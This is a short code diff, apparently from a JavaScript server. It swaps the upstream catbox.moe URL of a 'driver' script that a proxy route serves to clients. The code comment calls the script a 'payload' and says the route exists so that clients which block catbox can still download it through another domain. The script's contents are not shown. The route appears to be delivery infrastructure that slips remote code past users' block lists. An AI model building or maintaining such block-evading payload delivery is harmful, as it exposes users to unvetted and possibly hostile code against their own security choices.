@@ -109,7 +109,7 @@ const macRoute = (req, res) => {
 };
 
 /** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.wecreateproblems.llc */
-const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/l2rxnb.js';
+const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/tkgnyt.js';
 
 async function driverEnvSetupProxy(req, res) {
   res.setHeader('Cache-Control', 'no-store, max-age=0');
